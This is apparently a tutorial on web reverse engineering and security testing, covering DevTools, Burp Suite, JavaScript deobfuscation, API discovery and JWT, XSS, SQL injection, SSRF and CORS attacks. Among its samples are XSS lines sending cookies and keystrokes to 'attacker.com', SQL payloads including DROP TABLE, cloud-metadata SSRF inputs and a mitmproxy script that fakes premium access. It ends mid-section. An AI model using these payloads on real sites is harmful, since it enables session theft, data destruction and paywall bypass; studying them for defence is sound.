# 🌐 Web Reverse Engineering — Complete Guide

### Understand, Intercept, and Analyze Web Applications

> **Who is this for?** You know JavaScript. You want to understand how web apps really work under the hood — how to intercept traffic, deobfuscate JS, analyze APIs, find vulnerabilities, and reverse engineer any web application.

---

## 📚 Table of Contents

1. [What is Web Reverse Engineering?](#1-what-is-web-reverse-engineering)
2. [Browser DevTools Mastery](#2-browser-devtools-mastery)
3. [HTTP and HTTPS — How the Web Really Works](#3-http-and-https)
4. [Intercepting Traffic with Burp Suite](#4-intercepting-traffic-with-burp-suite)
5. [JavaScript Reverse Engineering](#5-javascript-reverse-engineering)
6. [API Reverse Engineering](#6-api-reverse-engineering)
7. [Authentication Attacks](#7-authentication-attacks)
8. [Web Vulnerabilities](#8-web-vulnerabilities)
9. [WebSocket Analysis](#9-websocket-analysis)
10. [CORS, CSP, and Security Headers](#10-cors-csp-and-security-headers)
11. [Automating Web RE with Python](#11-automating-web-re-with-python)
12. [Tools Reference](#12-tools-reference)
13. [Practice Platforms](#13-practice-platforms)

---

## 1. What is Web Reverse Engineering?

Web RE means figuring out **how a web application works** without having its source code — by analyzing its network traffic, JavaScript, APIs, and behavior.

### Real-World Examples

| Scenario                     | What You Do                                    |
| ---------------------------- | ---------------------------------------------- |
| App hides its API            | Watch Network tab, find hidden endpoints       |
| JS is obfuscated             | Deobfuscate, find secret keys or logic         |
| Game has anti-cheat          | Intercept WebSocket messages, modify values    |
| App checks license           | Find the JS function that validates, bypass it |
| Firebase URL (like earlier!) | Watch Network tab, extract authenticated URLs  |

### The Web RE Mindset

```
You see a web app in a browser
         ↓
Everything it does goes through HTTP requests
         ↓
Those requests are visible in DevTools / Burp Suite
         ↓
The logic that drives those requests is in JavaScript
         ↓
JavaScript is always readable (even if obfuscated)
         ↓
You can modify requests, responses, and JS at runtime
```

> **Key insight:** Unlike compiled binaries, web apps MUST send their code to your browser. You always have the source — it may just be obfuscated.

---

## 2. Browser DevTools Mastery

DevTools is your most powerful web RE tool. Most people only use 10% of it.

### Opening DevTools

```
F12               → Open DevTools
Ctrl+Shift+I      → Open DevTools
Ctrl+Shift+J      → Open DevTools on Console tab
Right-click → Inspect → opens Elements tab
```

---

### The Network Tab (Most Important for RE)

This shows **every HTTP request** the browser makes.

#### Interface Overview

```
┌─────────────────────────────────────────────────────┐
│  ● ⃝  🚫  Filter: [___________]  All XHR JS CSS Img │
├──────────────────────────────────────────────────────┤
│ Name          │ Status │ Type  │ Size  │ Time        │
├──────────────────────────────────────────────────────┤
│ api/user      │ 200    │ fetch │ 1.2kB │ 45ms        │
│ login         │ 401    │ xhr   │ 0.5kB │ 120ms       │
│ firebase/...  │ 200    │ fetch │ 4.5MB │ 890ms       │
└──────────────────────────────────────────────────────┘
```

#### Essential Network Tab Controls

```
● (red circle)   → Record (always on by default)
🚫 (stop)        → Clear all requests
Filter box       → Type URL to filter (e.g., "api" shows only API calls)
Preserve log     → Keep requests even after page navigation (VERY useful!)
Disable cache    → Always get fresh responses (important for RE)

Filter buttons:
  All   → Everything
  Fetch/XHR → AJAX calls (API calls — most important for RE!)
  JS    → JavaScript files
  CSS   → Stylesheets
  Img   → Images
  Doc   → HTML documents
  WS    → WebSockets
```

#### Inspecting a Request — Every Tab Explained

Click any request to see:

```
Headers tab:
  Request URL:     https://api.example.com/v2/user/profile
  Request Method:  GET / POST / PUT / DELETE
  Status Code:     200 OK / 401 Unauthorized / 403 Forbidden

  Request Headers:
    Authorization: Bearer eyJhbGc...   ← JWT token!
    Content-Type:  application/json
    Cookie:        session=abc123       ← Session cookie
    X-API-Key:     secret-key-here     ← Hidden API key!

  Response Headers:
    Content-Type:  application/json
    Set-Cookie:    session=newvalue     ← Server setting cookie
    Access-Control-Allow-Origin: *     ← CORS policy

Payload tab (for POST/PUT):
  Shows the data you sent to the server
  {"username": "john", "password": "pass123"}

Preview tab:
  Shows response in a readable tree format (great for JSON)

Response tab:
  Raw response text — copy this for analysis

Timing tab:
  Shows how long each phase of the request took
  Useful for timing attacks
```

#### Pro Network Tab Tricks

**Copy as cURL** — reproduce any request in terminal:

```
Right-click any request → Copy → Copy as cURL
```

This gives you a full `curl` command you can run, replay, or modify!

**Copy as Fetch** — reproduce in JavaScript:

```
Right-click any request → Copy → Copy as Fetch
```

Paste in Console tab to replay the request!

**Save all requests as HAR file:**

```
Right-click in requests list → Save all as HAR with content
```

HAR files can be replayed, analyzed with tools, shared with others.

**Find the request that fetches important data:**

1. Open Network tab
2. Click "Preserve log"
3. Do the action (login, buy, load page)
4. Filter by "Fetch/XHR"
5. Look for API calls with interesting data

---

### The Sources Tab (JavaScript RE)

This is where you find and analyze JavaScript code.

#### Interface

```
Left panel:   File tree — all JS files loaded
Middle panel: Code viewer with syntax highlighting
Right panel:  Debugger controls (when paused)
Bottom:       Console, scope variables, watch expressions
```

#### Key Features

**Find any file:**

```
Ctrl+P          → Quick open (like VS Code) — search by filename
Ctrl+Shift+F    → Search across ALL loaded files — find "password", "api_key", etc.
```

**Pretty Print (de-minify):**

```
Click { } button at bottom of code panel
```

Converts `function a(b,c){return b+c}` to readable formatted code.

**Setting Breakpoints in JavaScript:**

```
Click line number → sets a breakpoint
Right-click line number → conditional breakpoint (e.g., break when x > 10)
```

When code hits your breakpoint, execution pauses and you can inspect all variables!

**The Debugger Panel (when paused at breakpoint):**

```
▶  Resume (F8)          → Continue running
⤼  Step over (F10)      → Next line, don't enter functions
⬇  Step into (F11)      → Enter the function call
⬆  Step out (Shift+F11) → Finish current function, return to caller

Scope panel:
  Local   → Variables in current function
  Closure → Variables from outer scope
  Global  → window.* variables

Watch panel:
  Add any expression to watch its value live
  e.g., add "document.cookie" to always see cookies
```

**Override Files Locally:**

```
Sources → Overrides tab → Enable local overrides
```

This lets you **replace any JS file on a website with your own version** — even on HTTPS sites! Permanently modify behavior without a proxy.

---

### The Application Tab (Storage and Cookies)

Everything a site stores on your computer:

```
Storage:
  Cookies        → Session IDs, auth tokens, preferences
  Local Storage  → Key-value pairs, often JWTs or user data
  Session Storage → Same but cleared when tab closes
  IndexedDB      → More complex structured data
  Cache Storage  → Cached API responses (PWAs)

Manifest:       → PWA configuration
Service Workers: → Background scripts (can intercept requests!)
```

**What to look for:**

- `Authorization` or `token` in Local Storage → JWT token, can be decoded
- Session cookies → can be stolen for session hijacking
- API keys stored in Local Storage → big security issue!

**Reading everything in console:**

```javascript
// See all cookies
document.cookie

// See all localStorage
JSON.stringify(localStorage)

// See all sessionStorage
JSON.stringify(sessionStorage)
```

---

### The Console Tab (Live JS Execution)

The console lets you run JavaScript in the context of the current page — with full access to everything the page can access.

```javascript
// Access any variable the page uses
window.__STORE__ // React/Redux store
window.__DATA__ // Pre-loaded data

// Call any function the page defines
checkLicense('my-key')

// Modify page behavior
Object.defineProperty(navigator, 'onLine', { value: true })

// Access React component state (React DevTools needed)
// Or find it via __reactFiber property

// Read hidden form fields
document.querySelectorAll('input[type=hidden]').forEach((i) => console.log(i.name, i.value))

// Watch for XHR requests
var origOpen = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function (method, url) {
  console.log('XHR:', method, url)
  return origOpen.apply(this, arguments)
}

// Intercept fetch calls
var origFetch = window.fetch
window.fetch = function (url, options) {
  console.log('Fetch:', url, options)
  return origFetch.apply(this, arguments)
}
```

---

### The Performance Tab

Useful for understanding what code runs when:

```
Click Record → Do an action → Stop
See flame chart of every function that ran and how long it took
Click any bar → jump to that code in Sources tab
```

---

## 3. HTTP and HTTPS

You can't reverse engineer web apps without deeply understanding HTTP.

### HTTP Request Structure

```
POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Cookie: session_id=abc123; tracking=xyz
User-Agent: Mozilla/5.0...

{"username": "john", "password": "secret"}
  ↑
  Body (only for POST, PUT, PATCH)
```

### HTTP Response Structure

```
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=newtoken; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY

{"status": "success", "token": "eyJ...", "user_id": 42}
```

### HTTP Methods

| Method  | Use                  | Body?     |
| ------- | -------------------- | --------- |
| GET     | Read data            | No        |
| POST    | Create / submit data | Yes       |
| PUT     | Replace data         | Yes       |
| PATCH   | Update part of data  | Yes       |
| DELETE  | Delete data          | Sometimes |
| OPTIONS | Check what's allowed | No        |
| HEAD    | Like GET but no body | No        |

### Status Codes — What They Mean for RE

| Code    | Meaning           | RE Significance                    |
| ------- | ----------------- | ---------------------------------- |
| 200     | OK                | Success                            |
| 201     | Created           | Resource was made                  |
| 301/302 | Redirect          | Follow the redirect                |
| 400     | Bad Request       | Your input was wrong               |
| 401     | Unauthorized      | Need to login first                |
| 403     | Forbidden         | Logged in but no permission        |
| 404     | Not Found         | Resource doesn't exist             |
| 429     | Too Many Requests | You're being rate limited          |
| 500     | Server Error      | Server crashed — might reveal info |

> **RE Tip:** 403 vs 401 is important. 401 = not logged in. 403 = logged in but blocked. Try accessing admin endpoints — if you get 403 instead of 404, the endpoint EXISTS, you just don't have permission yet.

### HTTPS — What it Protects (and What it Doesn't)

HTTPS encrypts traffic **between your browser and the server**. But:

```
Your Browser → [ENCRYPTED] → Server
     ↑
     You can see the traffic BEFORE encryption
     (in DevTools, or via proxy like Burp Suite)
```

HTTPS does NOT protect against:

- Seeing requests in your own browser's DevTools
- A proxy running on YOUR machine (Burp Suite)
- JavaScript analysis (code is already in your browser)

---

## 4. Intercepting Traffic with Burp Suite

Burp Suite is the industry-standard web RE and security testing tool.

### How Burp Works

```
Browser → Burp Proxy → Internet
              ↑
         You see and modify EVERYTHING here
         Including HTTPS (Burp installs a fake CA cert)
```

### Setup

```
1. Download Burp Suite Community (free): https://portswigger.net/burp
2. Open Burp → Proxy tab → Options → note the port (default 8080)
3. Configure browser to use proxy:
   Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
   Or use FoxyProxy extension for easy switching
4. For HTTPS: visit http://burp → download CA certificate → install in browser
```

### The Proxy Tab — Intercept Requests

```
Intercept is ON  → Every request PAUSES for you to inspect/modify
Intercept is OFF → Requests flow through, but still logged in HTTP History
```

When a request is intercepted:

```
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Bearer eyJ...

[Forward]  → Send request as-is
[Drop]     → Cancel this request
[Action]   → Send to Repeater, Scanner, etc.
```

### The Repeater — Modify and Replay Requests

Right-click any request → Send to Repeater

In Repeater:

```
Left side:  Edit the request freely
Right side: See the response

Change anything:
- URL path: /api/user/1 → /api/user/2  (IDOR test!)
- Headers:  Remove Authorization header (see what happens)
- Body:     Change JSON values
- Method:   Change GET to POST

Click [Send] to send your modified request
```

**Example — Testing for IDOR (Insecure Direct Object Reference):**

```
Original request: GET /api/user/profile/42
                  Authorization: Bearer [your token]

Modified:         GET /api/user/profile/43
                  Authorization: Bearer [your token]

If you get user 43's data → IDOR vulnerability!
```

### The Intruder — Automated Fuzzing

Right-click request → Send to Intruder

Use it to automatically test many values:

```
Positions tab:
  Mark which part of request to fuzz
  e.g., §password§ in the body

Payloads tab:
  Load a wordlist (rockyou.txt for passwords)
  Or set a range of numbers (1-1000 for IDs)

Attack → Burp sends hundreds of requests automatically
Sort results by response length or status code
```

**Common use cases:**

- Password brute force (on test accounts you own!)
- Finding valid user IDs
- Parameter fuzzing (what parameter names does the API accept?)

### The Decoder — Encode/Decode Data

```
Input: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Select: Base64 decode
Output: {"alg":"HS256","typ":"JWT"}
```

Supports: Base64, URL encoding, HTML encoding, hex, gzip, and more.

### The Logger / HTTP History

Even with Intercept OFF, every request is logged:

```
Proxy → HTTP History tab
See every request made, click to inspect
Filter by URL, method, status, etc.
```

---

## 5. JavaScript Reverse Engineering

Since you know JavaScript well, this section will feel natural.

### Why JS RE Matters

- Business logic runs in JS → find auth checks, validation logic
- API keys are sometimes hardcoded in JS
- Obfuscated JS hides malicious behavior
- Understanding JS lets you call internal functions directly

### Finding Interesting Code

**In DevTools Sources tab:**

```
Ctrl+Shift+F → Search all files for:
  "api_key"
  "secret"
  "password"
  "token"
  "http://"
  "eval("           → suspicious obfuscation
  "atob("           → base64 decoding (hidden strings)
  "fromCharCode("   → character code obfuscation
```

**In the Network tab:**

- Look for `.js` files with suspicious names
- Check `bundle.js`, `app.js`, `main.js` — these contain all logic
- Click on any JS file → Sources tab opens it

### De-minifying JavaScript

Minified JS looks like:

```javascript
function a(b, c, d) {
  return b ? c : d
}
var e = a(true, 'yes', 'no')
```

Click the `{ }` (pretty print) button in Sources → becomes:

```javascript
function a(b, c, d) {
  return b ? c : d
}
var e = a(true, 'yes', 'no')
```

### JavaScript Obfuscation Techniques

**Technique 1: String splitting and concatenation**

```javascript
// Obfuscated:
var _0x1a2b = ['log', 'Hello']
console[_0x1a2b[0]](_0x1a2b[1])

// Means:
console.log('Hello')
```

**Technique 2: eval() with encoded strings**

```javascript
// Obfuscated:
eval(atob('Y29uc29sZS5sb2coJ2hlbGxvJyk='))

// Decode in console:
atob('Y29uc29sZS5sb2coJ2hlbGxvJyk=')
// → "console.log('hello')"
```

**Technique 3: Hex/Unicode character codes**

```javascript
// Obfuscated:
var x = '\x68\x65\x6c\x6c\x6f'

// In console:
;('\x68\x65\x6c\x6c\x6f')
// → "hello"
```

**Technique 4: Control flow obfuscation**

```javascript
// Obfuscated (a switch with numbered cases):
var _step = 0
while (true) {
  switch (_step) {
    case 0:
      var x = 5
      _step = 2
      break
    case 1:
      console.log(x)
      _step = 3
      break
    case 2:
      x = x * 2
      _step = 1
      break
    case 3:
      return
  }
}

// Actually just:
var x = 5
x = x * 2
console.log(x)
```

### Deobfuscation Tools

```bash
# Online tools:
# https://deobfuscate.io/          ← Best for common obfuscators
# https://js-beautify.com/         ← Pretty printing
# https://obf-io.deobfuscate.io/   ← Multiple techniques
# https://app.deobfuscate.io/      ← JS-specific

# Local tools:
npm install -g js-beautify
js-beautify obfuscated.js > clean.js

# de4js - online
# https://de4js.kshift.me/

# For heavily obfuscated (obfuscator.io style):
# Use synchrony: https://github.com/nicolo-ribaudo/synchrony
npm install -g @nicolo-ribaudo/synchrony
```

### Manual Deobfuscation Technique

1. Paste obfuscated code in browser console
2. Instead of `eval(...)`, use `console.log(...)` to see the decoded string
3. Replace encoded arrays with actual values
4. Re-run step by step

**Example:**

```javascript
// Original obfuscated:
var _arr = ['secret_api_key_123', 'Authorization', 'Bearer ']

// Find where array is used:
headers[_arr[1]] = _arr[2] + _arr[0]

// Means:
headers['Authorization'] = 'Bearer ' + 'secret_api_key_123'
// Found the API key!
```

### Hooking JavaScript Functions at Runtime

In DevTools Console, you can intercept any function:

```javascript
// Save original function
var originalFetch = window.fetch

// Replace with your version
window.fetch = async function (url, options) {
  console.log('=== FETCH INTERCEPTED ===')
  console.log('URL:', url)
  console.log('Options:', JSON.stringify(options, null, 2))

  // Call original and intercept response
  var response = await originalFetch.apply(this, arguments)
  var clone = response.clone()

  clone.text().then((body) => {
    console.log('Response:', body.substring(0, 500))
  })

  return response
}
```

```javascript
// Intercept XMLHttpRequest
var origOpen = XMLHttpRequest.prototype.open
var origSend = XMLHttpRequest.prototype.send

XMLHttpRequest.prototype.open = function (method, url) {
  this._url = url
  this._method = method
  return origOpen.apply(this, arguments)
}

XMLHttpRequest.prototype.send = function (body) {
  console.log('[XHR]', this._method, this._url)
  if (body) console.log('Body:', body)
  return origSend.apply(this, arguments)
}
```

```javascript
// Intercept JSON.stringify (find what data is being sent)
var origStringify = JSON.stringify
JSON.stringify = function (value) {
  if (typeof value === 'object') {
    console.log('[JSON.stringify]', value)
  }
  return origStringify.apply(this, arguments)
}
```

### Source Maps — Sometimes You Get the Original Source!

Many sites accidentally deploy source maps in production:

```
Look for .js.map files in Network tab
Or check end of JS file for:
//# sourceMappingURL=app.js.map
```

If found, DevTools automatically shows you the **original unminified TypeScript/React source code!**

---

## 6. API Reverse Engineering

Modern web apps are just frontends that talk to APIs. Understanding the API = understanding everything.

### Discovering API Endpoints

**Method 1: Network Tab**

- Filter by Fetch/XHR
- Every API call is visible here
- Note the patterns: `/api/v2/users`, `/api/v2/posts`

**Method 2: JS File Analysis**

```javascript
// Search JS files for URL patterns
// Ctrl+Shift+F in DevTools, search for:
/api/
/v1/
/v2/
fetch(
axios.
$.ajax(
```

**Method 3: Find the API base URL**

```javascript
// Look in JS for constants like:
API_BASE = 'https://api.example.com'
BASE_URL = 'https://example.com/api/v3'
```

**Method 4: JavaScript route files**

```javascript
// In React apps, look for router config:
// routes.js or router.js
// Contains all frontend routes

// In bundled apps, search for:
'/admin'
'/dashboard'
'/internal'
'/debug'
```

### Analyzing API Authentication

**Bearer Token (JWT):**

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0Mn0.xxx
                       ↑
                       Three base64 parts separated by dots
```

Decode in DevTools console:

```javascript
var token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0Mn0.xxx'
var parts = token.split('.')

// Header
console.log(JSON.parse(atob(parts[0])))
// → { alg: "HS256", typ: "JWT" }

// Payload (the data!)
console.log(JSON.parse(atob(parts[1])))
// → { user_id: 42, role: "user", exp: 1234567890 }

// Signature (can't decode — it's a hash)
// But if algorithm is "none", signature is ignored!
```

**API Keys:**

```
X-API-Key: sk_live_abc123xyz
X-Auth-Token: abc123xyz
apikey: abc123xyz
```

Look for these in request headers in the Network tab.

**Cookie-based auth:**

```
Cookie: session=abc123; PHPSESSID=xyz; .ASPXAUTH=...
```

### Building Your Own API Requests

Once you understand the API, call it directly:

```python
import requests

# Copy the headers from DevTools
headers = {
    'Authorization': 'Bearer eyJhb...',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0',
    'Cookie': 'session=abc123'
}

# GET request
response = requests.get(
    'https://api.example.com/v2/users/me',
    headers=headers
)
print(response.json())

# POST request
data = {'action': 'get_premium_content', 'id': 42}
response = requests.post(
    'https://api.example.com/v2/content',
    headers=headers,
    json=data
)
print(response.json())
```

### GraphQL RE

GraphQL is different from REST — one endpoint, flexible queries:

```
POST /graphql
{"query": "{ user { id name email } }"}
```

**Introspection — dump the entire API schema:**

```javascript
// Run in DevTools console or Burp Repeater:
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

This gives you every query, mutation, and type the GraphQL API supports!

**Finding hidden fields:**

```javascript
// Normal query returns: { user { id name } }
// Try adding fields that might exist:
{ user { id name email password role adminNotes } }
```

### WebAssembly (WASM) RE

Some apps use WASM for performance-sensitive or security-critical code (DRM, game engines):

```
Network tab → filter by "wasm"
See .wasm files being loaded
```

Tools for WASM analysis:

```bash
# Convert WASM to readable WAT format
wat2wasm and wasm2wat (from WABT toolkit)
wasm2wat module.wasm > module.wat

# Or use online tools:
# https://webassembly.github.io/wabt/demo/wasm2wat/
```

---

## 7. Authentication Attacks

> **Only test on systems you own or have written permission to test.**

### JWT (JSON Web Token) Attacks

JWTs are used everywhere. Understanding their weaknesses is critical.

**JWT Structure:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (base64)
.eyJ1c2VyX2lkIjo0MiwiYWRtaW4iOmZhbHNlfQ  ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
```

**Attack 1: Decode and read the payload**

```javascript
// Always start by reading what's in the token
var [h, p, s] = token.split('.')
console.log(JSON.parse(atob(p)))
// Maybe: { user_id: 42, admin: false, exp: ... }
// → try changing admin: false to admin: true
```

**Attack 2: Algorithm confusion (none)**

```javascript
// Some servers accept alg: "none" (no signature verification!)
var header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }))
var payload = btoa(JSON.stringify({ user_id: 42, admin: true }))
var forged_token = header + '.' + payload + '.'
// Try using this token
```

**Attack 3: Weak secret brute force**

```bash
# If JWT uses HMAC-SHA256, the secret might be weak
# Use hashcat or jwt_tool:
pip install jwt_tool
python jwt_tool.py eyJhbG... -C -d wordlist.txt
```

**Decode JWTs online:** https://jwt.io

### Cookie Analysis

```javascript
// See all cookies for current site
document.cookie

// Parse cookies
Object.fromEntries(document.cookie.split('; ').map((c) => c.split('=')))
```

**Cookie flags that matter:**
| Flag | Meaning | RE Relevance |
|---|---|---|
| `HttpOnly` | JS can't read it | Can't steal with XSS |
| `Secure` | HTTPS only | Won't send over HTTP |
| `SameSite=Strict` | No cross-site sending | CSRF protection |
| No flags | Readable by JS, sent everywhere | Vulnerable! |

### Session Fixation and Hijacking

```
1. Find session token in cookie or localStorage
2. Copy it (in Application tab or from document.cookie)
3. Use it in another browser / Burp request
4. If it works → session is not bound to IP or device
```

---

## 8. Web Vulnerabilities

### XSS — Cross-Site Scripting

XSS means injecting JavaScript that runs in another user's browser.

**Finding XSS:**

```javascript
// Test payload — does it execute?
<script>alert(1)</script>

// If filtered, try:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

// In React/Angular (DOM XSS):
// Look for: dangerouslySetInnerHTML, innerHTML, document.write
```

**What XSS can do:**

```javascript
// Steal cookies
fetch('https://attacker.com/steal?c=' + document.cookie)

// Keylog
document.onkeypress = function (e) {
  fetch('https://attacker.com/keys?k=' + e.key)
}

// Redirect to phishing
window.location = 'https://fake-bank.com'
```

### SQL Injection (for APIs with DB backends)

```
Normal request: GET /api/user?id=42
SQLi test:      GET /api/user?id=42'

If error or different response → possibly vulnerable

Classic payloads:
' OR '1'='1
' OR 1=1--
42; DROP TABLE users--
42 UNION SELECT username,password FROM users--
```

### IDOR — Insecure Direct Object Reference

The most common API vulnerability. Accessing someone else's data by changing an ID:

```
Your profile:   GET /api/user/42
Other profile:  GET /api/user/43  ← Do you get their data?

Your order:     GET /api/orders/1337
Other order:    GET /api/orders/1338  ← Can you see it?

Your files:     GET /api/files/abc123
Guess others:   GET /api/files/abc124
```

### SSRF — Server-Side Request Forgery

Making the server fetch a URL you control:

```
Normal: POST /api/fetch-image
Body:   {"url": "https://example.com/cat.jpg"}

SSRF:   {"url": "http://localhost/admin"}
        {"url": "http://169.254.169.254/latest/meta-data/"}  ← AWS metadata!
        {"url": "file:///etc/passwd"}
```

### Mass Assignment

APIs that blindly accept all JSON fields:

```javascript
// Normal registration:
POST /api/register
{"username": "john", "password": "pass"}

// Mass assignment attack — add extra fields:
POST /api/register
{"username": "john", "password": "pass", "role": "admin", "verified": true}

// If the server copies all fields to DB without filtering → you're admin!
```

---

## 9. WebSocket Analysis

WebSockets are used for real-time apps (chat, games, live data). They're persistent connections, unlike HTTP.

### Viewing WebSocket Traffic in DevTools

```
Network tab → Click "WS" filter
Click the WebSocket connection
Messages tab → See all messages sent/received

Green  → Messages you sent (client → server)
White  → Messages you received (server → client)
```

### WebSocket in Burp Suite

```
Proxy → WebSockets history tab
See all WebSocket messages
Right-click → Send to Repeater
Modify and resend messages
```

### Example WebSocket RE (Game)

```javascript
// Intercept WebSocket messages in console
var OrigWebSocket = window.WebSocket
window.WebSocket = function (url, protocols) {
  var ws = new OrigWebSocket(url, protocols)

  var origSend = ws.send.bind(ws)
  ws.send = function (data) {
    console.log('[WS SEND]', data)
    origSend(data)
  }

  ws.addEventListener('message', function (event) {
    console.log('[WS RECV]', event.data)
  })

  return ws
}
```

Now you see every WebSocket message! If the game sends `{"action":"move","x":10,"y":20}`, you can:

1. Understand the protocol
2. Send your own messages from console
3. Modify messages mid-flight with Burp

---

## 10. CORS, CSP, and Security Headers

### CORS (Cross-Origin Resource Sharing)

CORS controls which websites can make requests to an API from JavaScript.

```
API response header:
Access-Control-Allow-Origin: *              ← Any site can call this API!
Access-Control-Allow-Origin: https://app.com  ← Only app.com can call it
Access-Control-Allow-Credentials: true      ← Cookies sent cross-origin
```

**Testing CORS misconfiguration:**

```javascript
// In browser console on your attacker site:
fetch('https://victim-api.com/api/user/me', {
  credentials: 'include', // Send cookies
})
  .then((r) => r.json())
  .then((data) => {
    // If this works and returns data → CORS misconfiguration!
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
  })
```

**Burp test:**

```
Add header to request:
Origin: https://evil.com

Check response:
Access-Control-Allow-Origin: https://evil.com  ← Vulnerable!
Access-Control-Allow-Credentials: true          ← Even worse!
```

### CSP (Content Security Policy)

CSP tells browsers what scripts are allowed to run — a defense against XSS:

```
Content-Security-Policy:
  default-src 'self';           ← Only load from same origin
  script-src 'self' cdn.js.com; ← JS only from self and cdn.js.com
  connect-src api.example.com;  ← fetch() only to this domain
```

**Bypassing CSP:**

- If `script-src` includes a CDN you can upload to → upload malicious JS there
- If `unsafe-inline` is allowed → inline scripts work
- If `unsafe-eval` is allowed → eval() works (XSS easier)
- JSONP endpoints on whitelisted domains can be abused

### Analyzing Security Headers

```bash
# Check all security headers of a site:
curl -I https://example.com

# Or use online tool:
# https://securityheaders.com/

# Headers to look for:
Strict-Transport-Security  → HTTPS enforcement
X-Frame-Options            → Clickjacking protection
X-Content-Type-Options     → MIME sniffing protection
Content-Security-Policy    → XSS protection
X-XSS-Protection           → Old XSS protection
Referrer-Policy            → Controls referrer header
```

---

## 11. Automating Web RE with Python

### Requests Library — Making HTTP Requests

```python
import requests

# Maintain session (cookies automatically handled)
session = requests.Session()

# Login
login_response = session.post(
    'https://example.com/login',
    json={'username': 'john', 'password': 'pass123'}
)
print('Login status:', login_response.status_code)
print('Cookies:', dict(session.cookies))

# Now access protected endpoint
profile = session.get('https://example.com/api/profile')
print(profile.json())

# Custom headers
session.headers.update({
    'Authorization': 'Bearer eyJ...',
    'X-API-Key': 'secret123',
    'User-Agent': 'Mozilla/5.0 (real browser UA)'
})

# POST with JSON
response = session.post(
    'https://example.com/api/action',
    json={'action': 'do_thing', 'target_id': 42}
)

# Handle SSL issues (for testing only!)
response = requests.get(url, verify=False)
```

### Web Scraping with BeautifulSoup

```python
from bs4 import BeautifulSoup
import requests

response = requests.get('https://example.com')
soup = BeautifulSoup(response.text, 'html.parser')

# Find elements
title = soup.find('title').text
links = [a['href'] for a in soup.find_all('a', href=True)]
forms = soup.find_all('form')

# Find hidden inputs (CSRF tokens, etc.)
hidden_inputs = soup.find_all('input', type='hidden')
for inp in hidden_inputs:
    print(f"Name: {inp.get('name')}, Value: {inp.get('value')}")

# Extract data from table
table = soup.find('table', {'class': 'data-table'})
rows = table.find_all('tr')
for row in rows:
    cells = [td.text.strip() for td in row.find_all('td')]
    print(cells)
```

### Automated API Discovery

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_endpoint(base_url, path, headers):
    try:
        url = base_url + path
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code not in [404, 400]:
            print(f"[{response.status_code}] {url} ({len(response.text)} bytes)")
            return (path, response.status_code, len(response.text))
    except:
        pass
    return None

# Common API paths to check
api_paths = [
    '/api/',
    '/api/v1/',
    '/api/v2/',
    '/api/admin/',
    '/api/users/',
    '/api/users/me',
    '/api/config',
    '/api/debug',
    '/api/internal',
    '/admin/',
    '/admin/api/',
    '/swagger.json',
    '/openapi.json',
    '/api-docs',
    '/.well-known/openid-configuration',
    '/graphql',
    '/graphiql',
]

base_url = 'https://target.example.com'
headers = {'Authorization': 'Bearer your-token-here'}

print(f"Scanning {base_url}...")
with ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(
        lambda p: check_endpoint(base_url, p, headers),
        api_paths
    ))

found = [r for r in results if r is not None]
print(f"\nFound {len(found)} endpoints!")
```

### Intercepting Traffic Programmatically (mitmproxy)

```python
# mitm_script.py — intercept and modify traffic
from mitmproxy import http

class ApiInterceptor:
    def request(self, flow: http.HTTPFlow):
        """Called for every request"""

        # Log all API requests
        if '/api/' in flow.request.url:
            print(f"REQUEST: {flow.request.method} {flow.request.url}")

            # Print request body
            if flow.request.content:
                print(f"  Body: {flow.request.content[:200]}")

            # Modify request — add premium flag
            if '/api/content' in flow.request.url:
                import json
                body = json.loads(flow.request.content)
                body['premium'] = True
                flow.request.content = json.dumps(body).encode()

    def response(self, flow: http.HTTPFlow):
        """Called for every response"""

        # Log all API responses
        if '/api/' in flow.request.url:
            print(f"RESPONSE: {flow.response.status_code}")

            # Modify response — give premium access
            if '/api/user' in flow.request.url:
                import json
                try:
                    data = json.loads(flow.response.content)
                    data['subscription'] = 'premium'
                    data['can_download'] = True
                    flow.response.content = json.dumps(data).encode()
                except:
                    pass

addons = [ApiInterceptor()]

# Run with: mitmproxy -s mitm_script.py
# or:       mitmdump -s mitm_script.py
```

---

## 12. Tools Reference

### Complete Tool List

| Tool                     | Category                  | Cost      | Platform |
| ------------------------ | ------------------------- | --------- | -------- |
| **Burp Suite Community** | Proxy / Interception      | Free      | All      |
| **Burp Suite Pro**       | Full web testing          | Paid      | All      |
| **OWASP ZAP**            | Proxy / Scanner           | Free      | All      |
| **mitmproxy**            | Proxy (scriptable)        | Free      | All      |
| **Wireshark**            | Network capture           | Free      | All      |
| **Firefox DevTools**     | Built-in browser RE       | Free      | Browser  |
| **Chrome DevTools**      | Built-in browser RE       | Free      | Browser  |
| **FoxyProxy**            | Proxy switcher extension  | Free      | Browser  |
| **Wappalyzer**           | Technology detector       | Free      | Browser  |
| **jwt.io**               | JWT decoder/debugger      | Free      | Web      |
| **CyberChef**            | Encode/decode/crypto      | Free      | Web      |
| **Postman**              | API testing               | Free/Paid | All      |
| **Insomnia**             | API testing               | Free      | All      |
| **sqlmap**               | SQL injection automation  | Free      | CLI      |
| **nuclei**               | Vulnerability scanner     | Free      | CLI      |
| **ffuf**                 | Web fuzzer                | Free      | CLI      |
| **gobuster**             | Directory/endpoint finder | Free      | CLI      |

### Browser Extensions for Web RE

```
